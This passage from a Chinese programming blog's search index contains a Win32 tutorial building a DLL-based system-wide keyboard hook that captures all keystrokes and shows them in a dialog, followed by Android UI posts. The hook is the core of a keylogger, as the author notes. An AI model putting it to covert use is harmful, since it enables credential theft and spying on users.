<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>键盘钩子</title>
    <url>/2020/02/05/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/</url>
    <content><![CDATA[<h1 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h1><p>百度百科的解释：</p>
<hr>
<p>钩子(Hook)，是Windows消息处理机制的一个平台，应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它。钩子机制允许应用程序截获处理window消息或特定事件。<br>钩子实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p>
<hr>
<p>其实也是比较好理解的，就是Windows在处理一些东西的时候，例如发送数据包，删除文件夹，打字，点击鼠标之类的一些事件的时候都会根据钩子链这种东西一级一级的往下执行，比如我们的程序就有一个钩子在链中（我记得是后加入的钩子在钩子链的顶端），我们可以截获这个操作，然后对这个操作做一些手脚。</p>
<p>下面通过一个实例说明一下键盘钩子</p>
<h2 id="键盘钩子"><a href="#键盘钩子" class="headerlink" title="键盘钩子"></a>键盘钩子</h2><p>键盘钩子其实就是对键盘按下是的截获，之前一下垃圾盗号木马之类的应该就是截获这些鼠标钩子，如果我们截获的钩子不是当前我们的软件，而是想对某个进程或者系统进行截获，那就要用到DLL，因为DLL比较容易映射到别的进程中。</p>
<p>首先看一下程序的样子:<br><img src="img1.jpg" alt="效果图"></p>
<p>就是我们输入的内容都会被打印出来（但是我没有明确的进行大小写的区分，而是只根据lParam的扫描码直接输出的）。</p>
<h3 id="DLL部分编写"><a href="#DLL部分编写" class="headerlink" title="DLL部分编写"></a>DLL部分编写</h3><p>首先是我们要编写我们的DLL文件，新建一个之后我们在dllmain.cpp中进行编写。</p>
<p>头文件的定义我们需要先看一下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> KEYHOOKLIB_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYHOOKLIB_API __declspec(dllexport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYHOOKLIB_API __declspec(dllimport)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> HM_KEY WM_USER+101</span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL KEYHOOKLIB_API WINAPI <span class="title">SetHookkey</span><span class="params">(BOOL bInstall,DWORD dwThread = <span class="number">0</span> ,HWND hWndCaller = <span class="literal">NULL</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<p>首先先是判断是不是定义了那个导出宏，如果定义了的话呢我们就将其设置为导出，如果不是的话呢我们就将其设置为导入，这样写方便我们在主程序中进行编写。<br>然后定义一个消息，用来接收我们发送接收键盘的信息。<br>在定义唯一一个导出函数，就是设置钩子。</p>
<p>然后我们在cpp文件引入如下内容：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> KEYHOOKLIB_EXPORTS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"KeyMonitor.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg(<span class="meta-string">"Wker"</span>)<span class="comment">//这里的必须初始化,否无效</span></span></span><br><span class="line">HWND g_hWndCaller = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> data_seg()</span></span><br></pre></td></tr></table></figure>
<p>显示定义导出的宏，为了告诉编译器我们这个是要导出的函数，然后我们在设置一个区段，区段的内容必须初始化。这里设置区段是因为我们要讲我们的钩子放入别的程序中的时候我们的这个全局的变量如果不在一个我们自己的区段的话呢，那么每次被映射过去，我们的值都是没有了的。</p>
<p>首先是我们需要编写一个函数，使用来获取DLL实例句柄的：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">HMODULE WINAPI <span class="title">ModuleFromAddress</span><span class="params">(PVOID pv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	MEMORY_BASIC_INFORMATION mib;</span><br><span class="line">	<span class="keyword">if</span> (VirtualQuery(pv,&amp;mib,<span class="keyword">sizeof</span>(mib)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> (HMODULE)mib.AllocationBase;</span><br><span class="line"></span><br><span class="line">	&#125;<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>VirtualQuery</code>这个函数我们查询出要查询的内存地址各种信息，然后我们返回相对应的一个基地址。</p>
<p>然后我们就编写钩子函数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyHookProc</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">int</span> nCode,      <span class="comment">// hook code passed to hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">	WPARAM wParam,  <span class="comment">// value passed to hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">	LPARAM lParam   <span class="comment">// value passed to hook procedure</span></span></span></span><br><span class="line"><span class="function"><span class="params">	)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (nCode &lt; <span class="number">0</span> || nCode == HC_NOREMOVE)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> CallNextHookEx(g_hHook,nCode,wParam,lParam);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (lParam &amp; <span class="number">0X40000000</span>)<span class="comment">//如果在发送消息之前键关闭</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> CallNextHookEx(g_hHook,nCode,wParam,lParam);</span><br><span class="line">	&#125;</span><br><span class="line">	PostMessage(g_hWndCaller,HM_KEY,wParam,lParam);</span><br><span class="line">	<span class="keyword">return</span> CallNextHookEx(g_hHook,nCode,wParam,lParam);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先如果小于0或者等于HC_NOREMOVE的时候是不行的。<br>MSDN说明：如果代码小于0，则钩子子程必须将消息传递给CallNextHookEx函数，而无需进一步处理，并且应该返回由CallNextHookEx返回的值。<br>HC_NOREMOVE：这个好像就是说这个消息没有被移除，具体为什么不要这个消息，这个我现在没怎么去深究。</p>
<p>然后看下lParam：</p>
<table>
<thead>
<tr>
<th>Value</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>0–15</td>
<td>Specifies the repeat count. The value is the number of times the keystroke is repeated as a result of the user’s holding down the key.</td>
</tr>
<tr>
<td>16–23</td>
<td>Specifies the scan code. The value depends on the original equipment manufacturer (OEM).</td>
</tr>
<tr>
<td>24</td>
<td>Specifies whether the key is an extended key, such as a function key or a key on the numeric keypad. The value is 1 if the key is an extended key; otherwise, it is 0.</td>
</tr>
<tr>
<td>25–28</td>
<td>Reserved.</td>
</tr>
<tr>
<td>29</td>
<td>Specifies the context code. The value is 1 if the alt key is down; otherwise, it is 0.</td>
</tr>
<tr>
<td>30</td>
<td>Specifies the previous key state. The value is 1 if the key is down before the message is sent; it is 0 if the key is up.</td>
</tr>
<tr>
<td>31</td>
<td>Specifies the transition state. The value is 0 if the key is being pressed and 1 if it is being released.</td>
</tr>
</tbody></table>
<p>我们用0X40000000和他进行与操作，就是为了判断第三十位是不是0，如果在发送消息之前进行了关闭，那么我们就不接受这个东西了。<br>然后我们将我们接受到的消息发送给我们的窗口句柄。<br>最后返回值需要注意，返回0的话呢好像是截断，不继续传递下去了，如果要继续传递下去，那么就要<code>return CallNextHookEx(g_hHook,nCode,wParam,lParam);</code>。</p>
<p>设置钩子函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL WINAPI <span class="title">SetHookkey</span><span class="params">(BOOL bInstall,DWORD dwThread <span class="comment">/* = 0  */</span>,HWND hWndCaller <span class="comment">/* = NULL */</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bOK;</span><br><span class="line">	g_hWndCaller = hWndCaller;</span><br><span class="line">	<span class="keyword">if</span> (bInstall)</span><br><span class="line">	&#123;</span><br><span class="line">		g_hHook = SetWindowsHookEx(WH_KEYBOARD,KeyHookProc,ModuleFromAddress(KeyHookProc),dwThread);</span><br><span class="line">		bOK = (g_hHook != <span class="literal">NULL</span>);</span><br><span class="line">	&#125; </span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		bOK = UnhookWindowsHookEx(g_hHook);</span><br><span class="line">		g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> bOK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的话呢用到我们之前写的那个函数，这里有一点需要注意的就是，dwThread    如果是0的话呢就是系统。</p>
<p>然后我们写一下我们的配置文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">EXPORTS</span><br><span class="line">	SetHookkey</span><br><span class="line">SECTIONS</span><br><span class="line">	Wker Read Write Shared</span><br></pre></td></tr></table></figure>
<p>编写好之后我们，我们就生成一下解决方案。<br>我们这里先用静态的方式打开DLL，不要忘记lib文件。</p>
<h3 id="主程序"><a href="#主程序" class="headerlink" title="主程序"></a>主程序</h3><p>我们在主程序中进行导入：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../KeyMonitor/KeyMonitor.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment (lib,<span class="meta-string">"KeyMonitor.lib"</span>)</span></span><br></pre></td></tr></table></figure>
<p>导入我哦们的动态链接库和头文件，因为我们没有定义那个导出宏，所以我们这里的话呢就是导入。</p>
<p>然后加入一个Edit control，用来记录我们的信息。</p>
<p>首先在我们的初始化函数中加载钩子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">BOOL CMainKeyMonitorDlg::OnInitDialog()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnInitDialog();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动</span></span><br><span class="line">	<span class="comment">//  执行此操作</span></span><br><span class="line">	SetIcon(m_hIcon, TRUE);			<span class="comment">// 设置大图标</span></span><br><span class="line">	SetIcon(m_hIcon, FALSE);		<span class="comment">// 设置小图标</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// <span class="doctag">TODO:</span> 在此添加额外的初始化代码</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(!SetHookkey(TRUE,<span class="number">0</span>,m_hWnd))</span><br><span class="line">		MessageBox(<span class="string">"钩子加载失败"</span>);</span><br><span class="line">	retur</span><br></pre></td></tr></table></figure>

<p>加载完毕钩子之后，在我们窗口销毁的时候销毁钩子：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> CMainKeyMonitorDlg::OnDestroy()</span><br><span class="line">&#123;</span><br><span class="line">	CDialogEx::OnDestroy();</span><br><span class="line">	SetHookkey(FALSE);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然后我们将我们的消息进行映射：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">afx_msg LRESULT CMainKeyMonitorDlg::OnHmKey(WPARAM wParam, LPARAM lParam)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">char</span> szKey[<span class="number">80</span>];</span><br><span class="line">	GetKeyNameText(lParam,szKey,<span class="number">80</span>);</span><br><span class="line">	CString str,edit;</span><br><span class="line">	str.Format(<span class="string">"用户按键:%s\r\n"</span>,szKey);</span><br><span class="line">	GetDlgItemText(IDC_RECEDIT,edit);</span><br><span class="line">	SetDlgItemText(IDC_RECEDIT,str+edit);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过<code>GetKeyNameText</code>这个函数获得我们的输入内容。</p>
<hr>
<p>钩子类型更有很多，这里先就记录一下这个吧。</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android Button事件</title>
    <url>/2020/02/04/Android-Button%E4%BA%8B%E4%BB%B6/</url>
    <content><![CDATA[<h1 id="按钮常用事件枚举"><a href="#按钮常用事件枚举" class="headerlink" title="按钮常用事件枚举"></a>按钮常用事件枚举</h1><p>其实这些都是比较基本的，和点击事件之类的很像，学会一个其实就可以举一反三了，而且按钮是继承于TextView的。</p>
<h2 id="布局的一些操作"><a href="#布局的一些操作" class="headerlink" title="布局的一些操作"></a>布局的一些操作</h2><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:id</span>=<span class="string">"@+id/Button02"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_alignTop</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginLeft</span>=<span class="string">"24dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_marginTop</span>=<span class="string">"42dp"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">	    </span></span><br><span class="line"><span class="tag">	    </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:drawableLeft</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:drawablePadding</span>=<span class="string">"30dip"</span></span></span><br><span class="line"><span class="tag">	    <span class="attr">android:drawableTop</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">	    </span></span><br><span class="line"><span class="tag">	    <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个<code>drawableLeft</code>就是左边图片的资源，<code>drawablePadding</code>这个是图片和文字的距离。</p>
<hr>
<p>下面java代码用到的布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/AtEdit1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignParentBottom</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginBottom</span>=<span class="string">"168dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_above</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignRight</span>=<span class="string">"@+id/Button01"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginBottom</span>=<span class="string">"37dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"@drawable/ic_launcher"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Button"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tv_01 = (TextView) findViewById(R.id.Button01);</span><br><span class="line">Tv_01.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">		Button btn = (Button) v;</span><br><span class="line">		<span class="comment">//int WindowsWidth = getWindow().getWindowManager().getDefaultDisplay().getWidth();</span></span><br><span class="line">		<span class="comment">//Log.d("aaa", WindowsWidth+"");</span></span><br><span class="line">		<span class="keyword">if</span>(value == <span class="number">1</span> &amp;&amp; btn.getWidth() &gt;= <span class="number">300</span>)</span><br><span class="line">			value = -<span class="number">1</span>;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(value == -<span class="number">1</span> &amp;&amp; btn.getWidth() &lt; <span class="number">100</span>)</span><br><span class="line">			value = <span class="number">1</span>;</span><br><span class="line">		</span><br><span class="line">		btn.setWidth(btn.getWidth() + value*(<span class="keyword">int</span>)(btn.getWidth()*<span class="number">0.1</span>));</span><br><span class="line">		btn.setHeight(btn.getHeight() + value*(<span class="keyword">int</span>)(btn.getHeight()*<span class="number">0.1</span>));</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>这个就是一个比较典型的点击事件，就是通过放大缩小来展示的，传进来的View就是事件源。</p>
<h2 id="触摸事件"><a href="#触摸事件" class="headerlink" title="触摸事件"></a>触摸事件</h2><p>就是当你触摸到了就响应的一个事件，具体编写：<br>先要接口<code>implements OnTouchListener</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Tv_1.setOnTouchListener(<span class="keyword">this</span>);</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onTouch</span><span class="params">(View v, MotionEvent event)</span> </span>&#123;</span><br><span class="line">		<span class="comment">//触摸的时候触发</span></span><br><span class="line">		<span class="keyword">int</span> action = event.getAction();<span class="comment">//事件类型</span></span><br><span class="line">		<span class="keyword">switch</span> (action) &#123;</span><br><span class="line">		<span class="keyword">case</span> MotionEvent.ACTION_DOWN:<span class="comment">//是按下</span></span><br><span class="line">			Tv_1.setBackgroundResource(R.drawable.ic_l1);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">case</span> MotionEvent.ACTION_UP:<span class="comment">//是抬起</span></span><br><span class="line">			Tv_1.setBackgroundResource(R.drawable.ic_launcher);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		<span class="keyword">default</span>:</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="keyword">false</span>;<span class="comment">//事件是否继续传递下去，点击之类的</span></span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>这就是触摸换图<br>这里就是说通过event进行判断，是哪种动作，返回值的话呢就是是否继续传递下去，就和那个钩子链差不多。</p>
<h2 id="焦点事件"><a href="#焦点事件" class="headerlink" title="焦点事件"></a>焦点事件</h2><p><code>OnFocusChangeListener</code><br><code>Tv_01.setOnFocusChangeListener(this);</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFocusChange</span><span class="params">(View v, <span class="keyword">boolean</span> hasFocus)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(hasFocus)</span><br><span class="line">			Toast.makeText(<span class="keyword">this</span>, <span class="string">"哟焦点了"</span>,Toast.LENGTH_SHORT);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="代码实现图文混排"><a href="#代码实现图文混排" class="headerlink" title="代码实现图文混排"></a>代码实现图文混排</h2><p>既然Button是继承于TextView的，那么我们一样可以使用span。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">SpannableString span = <span class="keyword">new</span> SpannableString(<span class="string">"代码实现"</span>);</span><br><span class="line">ImageSpan imageSpan = <span class="keyword">new</span> ImageSpan(BitmapFactory.decodeResource(getResources(), R.drawable.ic_l1));</span><br><span class="line">span.setSpan(imageSpan, <span class="number">0</span>, <span class="number">4</span>, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);</span><br><span class="line">Tv_2.setText(span);</span><br><span class="line">Tv_2.append(<span class="string">"我的按钮"</span>);</span><br><span class="line">SpannableString span2 = <span class="keyword">new</span> SpannableString(<span class="string">"代码实现2"</span>);</span><br><span class="line">ImageSpan imageSpan2 = <span class="keyword">new</span> ImageSpan(BitmapFactory.decodeResource(getResources(), R.drawable.ic_l2));</span><br><span class="line">span2.setSpan(imageSpan2, <span class="number">0</span>,<span class="number">4</span>, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);</span><br><span class="line">Tv_2.append(span2);</span><br><span class="line"><span class="comment">//这个是在点击事件里面的</span></span><br></pre></td></tr></table></figure>
<p>首先我们先new一个<code>SpannableString</code>的对象，然后new一个图片的span对象，资源使我们的图片，然后将其放入<code>SpannableString</code>中，然后最终实现其效果，这里需要注意的是：字符长度是Unicode编码，所以中文也是占一个字符的。</p>
<p><img src="img1.gif" alt="实现效果"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>AutoCompleteTextView</title>
    <url>/2020/02/04/AutoCompleteTextView/</url>
    <content><![CDATA[<h2 id="AutoCompleteTextView"><a href="#AutoCompleteTextView" class="headerlink" title="AutoCompleteTextView"></a>AutoCompleteTextView</h2><p>这个东西就是一个就是一个提示文本，但是不知道是什么原因，在我的模拟器上面就是不好用，点击也不响应，可能是模拟器的版本问题吧。<br>首先要先新建一个layout，代码下面：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">AutoCompleteTextView</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    &gt;</span></span><br><span class="line">    </span><br><span class="line"><span class="tag">&lt;/<span class="name">AutoCompleteTextView</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在主layout中编写：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">AutoCompleteTextView</span> </span></span><br><span class="line"><span class="tag">		    <span class="attr">android:id</span>=<span class="string">"@+id/AtEdit1"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:completionThreshold</span>=<span class="string">"1"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">		    <span class="attr">android:imeOptions</span>=<span class="string">"actionDone"</span></span></span><br><span class="line"><span class="tag">		    /&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里面有一些参数<code>completionThreshold</code>，这个就是我们输入一个我们就可以弹出列表。<br>然后我们编写java代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> AutoCompleteTextView AtEt_1;</span><br><span class="line"><span class="comment">/*...*/</span></span><br><span class="line">		AtEt_1 = (AutoCompleteTextView) findViewById(R.id.AtEdit1);</span><br><span class="line">		String[] arr = &#123;<span class="string">"Wker"</span>,<span class="string">"Wker酷"</span>,<span class="string">"Wker帅"</span>&#125;;</span><br><span class="line">		ArrayAdapter&lt;String&gt;  adpter = <span class="keyword">new</span> ArrayAdapter&lt;String&gt;(<span class="keyword">this</span>, R.layout.atctext, arr);</span><br><span class="line">		AtEt_1.setAdapter(adpter);</span><br></pre></td></tr></table></figure>
<p>首先先是定义一个数组，里面有我们预先定义的数据，然后new一个ArrayAdapter的类，第一个参数是上下文，第二个参数是我们先前的资源布局，最后一个是我们的数据，最后在设置上。<br>实现效果：<br><img src="img1.jpg" alt="实现效果"><br>但是我这里会崩溃，不知道为什么。</p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>Android EditText</title>
    <url>/2020/02/04/Android-EditText/</url>
    <content><![CDATA[<h1 id="EditText"><a href="#EditText" class="headerlink" title="EditText"></a>EditText</h1><p>这个东西就是个编辑框，继承于TextView，对输入的东西可以进行验证与限制</p>
<h2 id="输入图片"><a href="#输入图片" class="headerlink" title="输入图片"></a>输入图片</h2><p>就有点像输入一个小表情差不多，不是很难实现，因为集成TextView所以我们一样可以使用<code>SpannableString</code>这个类，基本的实现代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> Button btn_1;</span><br><span class="line">	<span class="keyword">private</span> EditText Et_1;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">		<span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">		<span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.jmp_activity);</span><br><span class="line">		btn_1 = (Button) findViewById(R.id.button1);</span><br><span class="line">		Et_1 = (EditText) findViewById(R.id.Edit1);</span><br><span class="line">		btn_1.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">			</span><br><span class="line">			<span class="meta">@Override</span></span><br><span class="line">			<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">				SpannableString span = <span class="keyword">new</span> SpannableString(<span class="string">"Test"</span>);</span><br><span class="line">				ImageSpan imageSpan = <span class="keyword">new</span> ImageSpan(BitmapFactory.decodeResource(getResources(), R.drawable.ic_l1));</span><br><span class="line">				span.setSpan(imageSpan, <span class="number">0</span>, <span class="number">4</span>, Spannable.SPAN_EXCLUSIVE_EXCLUSIVE);</span><br><span class="line">				Et_1.append(span);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>
<p>首先我们点击按钮的时候，new一个<code>SpannableString</code>然后我们在new一个<code>ImageSpan</code>，在这个构造函数中需要一个Bitmap对象（老版本需要传一个上下文，现在过时了不需要了），我们用<code>BitmapFactory.decodeResource</code>这个进行获取，这个有两个参数：一个资源，另一个是ID，我们设置完成之后，我们就将这个图片span传递给文本span，然后再追加到我哦们的EditText中就可以了。<br><img src="img1.jpg" alt="输入图片"><br>需要注意的是我们<code>SpannableString</code>构造方法中传入的String是代表了我们这个图片，你选中图片之后输入文本就会选中一个Test。</p>
<h2 id="输入内容的限制与校验"><a href="#输入内容的限制与校验" class="headerlink" title="输入内容的限制与校验"></a>输入内容的限制与校验</h2><p>限制：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Edit1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:digits</span>=<span class="string">"abc"</span></span></span><br><span class="line"><span class="tag">    /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">EditText</span> </span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/Edit2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">       <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span 